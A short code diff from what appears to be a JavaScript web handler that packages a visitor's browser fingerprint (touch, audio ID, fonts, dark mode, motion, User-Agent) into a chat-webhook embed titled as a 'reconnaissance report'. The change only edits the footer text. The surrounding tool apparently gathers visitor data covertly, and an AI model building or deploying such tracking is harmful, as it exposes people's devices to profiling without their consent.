@@ -19,7 +19,7 @@ export default async function handler(req, res) {
                     { name: " Sensores & Comportamento", value: `**Touch:** ${d.touch}\n**AudioID:** ${d.audioID}\n**Fonts:** ${d.fonts}\n**Dark:** ${d.darkMode}\n**Motion:** ${d.motion}`, inline: true },
                     { name: " Navegador", value: `\`\`\`${h['user-agent']}\`\`\`` }
                 ],
-                footer: { text: "Relatório de Reconhecimento Absoluto" }
+                footer: { text: "Relatório de Reconhecimento" }
             }]
         };
 
